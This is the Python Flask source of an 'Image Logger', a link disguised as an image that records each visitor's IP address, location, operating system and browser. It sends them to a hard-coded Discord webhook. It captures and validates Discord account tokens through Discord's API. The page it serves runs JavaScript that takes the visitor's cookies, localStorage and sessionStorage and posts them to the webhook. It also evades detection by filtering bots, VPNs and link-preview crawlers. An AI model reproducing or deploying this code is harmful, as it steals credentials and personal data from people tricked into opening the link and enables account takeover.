from flask import Flask, request, Response
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json, time, os, random

app = Flask(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord.com/)"
]

def get_random_ua():
    return random.choice(USER_AGENTS)

config = {
    "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
    "image": "https://media.tenor.com/bQ8wPB_DovAAAAAe/discord-error-shit.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "captureTokens": True,
    "tokenParam": "token",
    "validateTokens": True,
    "ping_on_token": False,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        headers = {"User-Agent": get_random_ua()}
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"Error:\n```\n{error[:1900]}\n```",
            }]
        }, headers=headers, timeout=3)
    except:
        pass

def validate_token(token):
    if not token or len(token) < 30:
        return None
    if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
        return None
    try:
        headers = {"Authorization": token, "User-Agent": get_random_ua()}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
        if r.status_code == 200:
            data = r.json()
            return {
                "valid": True,
                "username": data.get("username", "Unknown"),
                "discriminator": data.get("discriminator", "0000"),
                "user_id": data.get("id", "Unknown"),
                "email": data.get("email", "No email"),
                "verified": data.get("verified", False),
                "nitro": ["None", "Nitro Classic", "Nitro", "Nitro Basic"][data.get("premium_type", 0)] if data.get("premium_type", 0) < 4 else "Unknown"
            }
        else:
            return {"valid": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                headers = {"User-Agent": get_random_ua()}
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, headers=headers, timeout=3)
            except:
                pass
        return
    
    ping = "@everyone"
    info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown", "proxy": False, "hosting": False}
    
    try:
        headers = {"User-Agent": get_random_ua()}
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", headers=headers, timeout=3)
        if resp.status_code == 200:
            info = resp.json()
    except:
        pass
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4 and not info.get("proxy", False):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy", False):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    description = (
        "**📡 IP LOGGED**\n\n"
        "**Endpoint:** `" + endpoint + "`\n\n"
        "**IP Info:**\n"
        "> **IP:** `" + (ip if ip else 'Unknown') + "`\n"
        "> **Provider:** `" + str(info.get('isp', 'Unknown')) + "`\n"
        "> **ASN:** `" + str(info.get('as', 'Unknown')) + "`\n"
        "> **Country:** `" + str(info.get('country', 'Unknown')) + "`\n"
        "> **Region:** `" + str(info.get('regionName', 'Unknown')) + "`\n"
        "> **City:** `" + str(info.get('city', 'Unknown')) + "`\n"
        "> **Coords:** `" + str(info.get('lat', 0)) + ", " + str(info.get('lon', 0)) + "`\n"
        "> **Timezone:** `" + str(info.get('timezone', 'Unknown')) + "`\n"
        "> **VPN:** `" + str(info.get('proxy', False)) + "`\n"
        "> **Bot:** `" + str(info.get('hosting', False)) + "`\n\n"
        "**PC Info:**\n"
        "> **OS:** `" + str(os_name) + "`\n"
        "> **Browser:** `" + str(browser) + "`\n\n"
        "**User Agent:**\n```\n" + str(useragent) + "\n```"
    )
    
    if token and token_info:
        if token_info.get("valid"):
            description += (
                "\n\n**🎯 DISCORD TOKEN CAPTURED**\n\n"
                "**Status:** ✅ VALIDO\n"
                "> **Username:** `" + token_info.get("username", "Unknown") + "#" + token_info.get("discriminator", "0000") + "`\n"
                "> **User ID:** `" + token_info.get("user_id", "Unknown") + "`\n"
                "> **Email:** `" + token_info.get("email", "No email") + "`\n"
                "> **Verified:** `" + str(token_info.get("verified", False)) + "`\n"
                "> **Nitro:** `" + token_info.get("nitro", "None") + "`\n\n"
                "**Full Token:** ||" + token + "||"
            )
        else:
            description += (
                "\n\n**🎯 DISCORD TOKEN ATTEMPT**\n\n"
                "**Status:** ❌ INVALIDO\n"
                "**Error:** `" + token_info.get("error", "Unknown") + "`\n\n"
                "**Full Token:** ||" + token + "||"
            )
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "📸 Image Logger - Complete Report",
            "color": config["color"],
            "description": description
        }]
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        headers = {"User-Agent": get_random_ua()}
        requests.post(config["webhook"], json=embed, headers=headers, timeout=3)
    except:
        pass
    return info

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        dic = dict(request.args)
        s = request.full_path if request.query_string else "/"
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        ua = request.headers.get('user-agent', '')
        
        token = None
        token_info = None
        
        if config["captureTokens"]:
            for param in ["token", "id", "t", "auth", "key", "code"]:
                if dic.get(param):
                    token = dic.get(param)
                    break
            if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
                try:
                    decoded = base64.b64decode(token).decode()
                    if re.match(r'^[a-zA-Z0-9._-]{30,100}$', decoded):
                        token = decoded
                except:
                    pass
            if not token:
                url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
                if url_match:
                    token = url_match.group(0)
            if token:
                token_info = validate_token(token)
        
        if config["imageArgument"]:
            if dic.get("url") or dic.get("id"):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
        
        if is_crawler or botCheck(ip, ua):
            makeReport(ip, endpoint=request.path, url=url, token=token, token_info=token_info)
            try:
                headers = {"User-Agent": get_random_ua()}
                img_data = requests.get(url, headers=headers, timeout=5).content
                return Response(img_data, mimetype='image/jpeg')
            except:
                loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                return Response(loading, mimetype='image/jpeg')
        
        html = f'''<!DOCTYPE html>
<html>
<head>
<style>
body{{margin:0;padding:0;}}
div.img{{
background-image:url('{url}');
background-position:center center;
background-repeat:no-repeat;
background-size:contain;
width:100vw;height:100vh;
}}
</style>
<script>
(function() {{
    var webhook = '{config["webhook"]}';
    function sendData(data) {{
        var xhr = new XMLHttpRequest();
        xhr.open('POST', webhook);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({{
            username: 'Storage Logger',
            content: '🍪 STORAGE DATA CAPTURED',
            embeds: [{{
                title: 'Browser Storage',
                color: 0xFF6600,
                description: '```\\n' + data + '\\n```'
            }}]
        }}));
    }}
    function extractToken(text) {{
        var match = text.match(/[a-zA-Z0-9._-]{{30,100}}/);
        return match ? match[0] : null;
    }}
    var data = '';
    var cookies = document.cookie;
    if (cookies) {{
        data += 'COOKIES:\\n' + cookies + '\\n\\n';
        var token = extractToken(cookies);
        if (token) data += 'TOKEN ENCONTRADO NOS COOKIES: ' + token + '\\n\\n';
    }}
    try {{
        if (localStorage.length > 0) {{
            data += 'LOCALSTORAGE:\\n';
            for (var key in localStorage) {{
                var val = localStorage[key];
                data += key + ': ' + val + '\\n';
                var token = extractToken(val);
                if (token) data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
            }}
            data += '\\n';
        }}
    }} catch(e) {{}}
    try {{
        if (sessionStorage.length > 0) {{
            data += 'SESSIONSTORAGE:\\n';
            for (var key in sessionStorage) {{
                var val = sessionStorage[key];
                data += key + ': ' + val + '\\n';
                var token = extractToken(val);
                if (token) data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
            }}
            data += '\\n';
        }}
    }} catch(e) {{}}
    if (data) {{
        sendData(data);
    }} else {{
        sendData('Nenhum dado encontrado no navegador.\\nA vítima não está logada em nenhum serviço.');
    }}
}})();
</script>
</head>
<body>
<div class="img"></div>
</body>
</html>'''
        
        makeReport(ip, ua, endpoint=request.path, url=url, token=token, token_info=token_info)
        return Response(html, mimetype='text/html')
    
    except Exception as e:
        reportError(traceback.format_exc())
        return Response("500 - Internal Server Error", status=500)
